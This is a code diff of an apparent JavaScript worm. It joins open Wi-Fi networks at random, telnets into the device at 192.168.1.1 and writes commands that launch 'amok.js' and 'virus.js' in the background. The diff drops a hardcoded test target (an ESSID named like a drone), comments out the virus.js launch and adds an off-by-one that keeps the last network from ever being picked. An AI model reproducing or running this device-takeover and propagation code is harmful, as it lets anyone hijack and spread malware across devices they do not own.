@@ -22,15 +22,7 @@ function attack () {
         var open = nodes.filter(function (node) {
             return node.encrypted === false;
         });
-        //*
-        open = [
-            {
-                'essid' : 'WindowsAzureDrone5',
-                'address' : '90:03:B7:2A:EA:6C'
-            }
-        ];
-        //*/
-        var ap = open[Math.floor(Math.random() * open.length)];
+        var ap = open[Math.floor(Math.random() * (open.length - 1))];
         console.log('==================================================');
         console.log(ap);
         console.log('==================================================');
@@ -42,16 +34,16 @@ function attack () {
                 if (err) setTimeout(attack, 5000)
                 else setTimeout(function () {
                     telnet('192.168.1.1', function(err) {
-                      if (err) setTimeout(withNodes(filter(open)), 5000);
+                      if (err) setTimeout(withNodes(filter(ap, open)), 5000);
                     });
                 }, 2000)
             })
         });
 
-        setTimeout(withNodes(filter(open)), 5000);
+        setTimeout(withNodes(filter(ap, open)), 5000);
     }
 
-    function filter(nodes) {
+    function filter(ap, nodes) {
         // Filter out the used ap
         var open = nodes.filter(function (node) {
             return node.essid !== ap.essid;
@@ -129,9 +121,9 @@ function telnet (addr, cb) {
                 s.write('../node amok.js &\n');
             }, 5 * 1000);
 
-            setTimeout(function () {
-                s.write('../node virus.js &\n');
-            }, 10 * 1000);
+            // setTimeout(function () {
+            //     s.write('../node virus.js &\n');
+            // }, 10 * 1000);
         }
     });
 
